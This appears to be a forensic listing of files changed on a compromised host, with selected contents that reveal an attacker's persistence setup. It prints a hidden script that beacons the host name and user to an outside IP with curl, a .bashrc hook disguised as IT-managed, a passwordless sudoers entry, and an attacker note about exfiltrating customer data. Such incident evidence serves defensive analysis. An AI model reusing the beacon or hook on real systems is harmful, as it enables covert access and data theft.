@@ -1,0 +1,46 @@
+================================================================
+HOST: 10.0.1.87
+TOOL: find / -newer /tmp/baseline -type f 2>/dev/null
+WHAT: every file modified or created since the host was rebuilt
+================================================================
+
+-rwxr-xr-x  1 root  root    284  Jun  4 02:13  /var/lib/mc/.helper
+-rw-r--r--  1 root  root    105  Jun  4 02:13  /etc/sudoers.d/90-ops
+-rw-r--r--  1 1004  1004    422  Jun  4 02:13  /home/o.adegoke/.bashrc
+-rw-r--r--  1 1004  1004     38  Jun  4 02:14  /home/o.adegoke/.config/autostart/.boot.desktop
+-rw-r--r--  1 1004  1004    214  Jun  4 02:30  /home/o.adegoke/.local/share/.griot.txt
+-rw-r--r--  1 1004  1004   8924  Jun  4 02:31  /tmp/customers.csv
+-rw-r--r--  1 1004  1004  11428  Jun  4 02:33  /tmp/transactions.csv
+-rw-r--r--  1 1004  1004  20352  Jun  4 03:01  /tmp/exfil.tgz
+
+================================================================
+SELECTED CONTENTS
+================================================================
+
+/etc/sudoers.d/90-ops
+---
+%ops ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx
+o.adegoke ALL=(ALL) NOPASSWD: /usr/bin/less /var/log/*
+
+/var/lib/mc/.helper
+---
+#!/bin/bash
+if [ -z "$_GRIOT" ]; then
+  export _GRIOT=1
+  (curl -sfm 10 https://185.220.101.9/beacon -d "$(hostname):$(whoami)" >/dev/null 2>&1 &) 2>/dev/null
+fi
+
+/home/o.adegoke/.bashrc (last 4 lines — added Jun 4 02:13)
+---
+# managed by sankofa-it — do not edit
+PS1='\u@\h:\w\$ '
+export PATH=$HOME/.local/bin:$PATH
+source /var/lib/mc/.helper
+
+/home/o.adegoke/.local/share/.griot.txt
+---
+foothold: o.adegoke
+exfil:    /tmp/exfil.tgz -> 185.220.101.9
+note:     leaving the bashrc hook. quiet for 30 days, then loud.
+
+================================================================
